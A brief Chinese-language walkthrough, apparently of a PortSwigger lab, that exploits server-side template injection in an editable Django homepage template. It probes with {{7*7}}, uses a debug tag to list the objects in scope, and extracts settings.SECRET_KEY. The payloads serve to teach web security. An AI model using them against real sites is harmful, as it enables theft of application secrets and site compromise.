网址首页的模板用户可以自由更改



验证漏洞：

```javascript
{{7*7}}
```

报错：

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/模板注入/images/65E6A62805084FE689A8FD61DCE2359Bclipboard.png)

此时已经说明和服务端有交互存在漏洞



根据报错信息，知道这是一个django框架的网址

payload:

```javascript
{`%` debug %}
```

输出将包含可以在此模板内访问的对象和属性的列表



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/模板注入/images/643DE0F6C9A241DF8E3C8364D3C00518clipboard.png)



可以使用setting对象



获取SECRET_KEY

payload:

```javascript
{{settings.SECRET_KEY}}
```

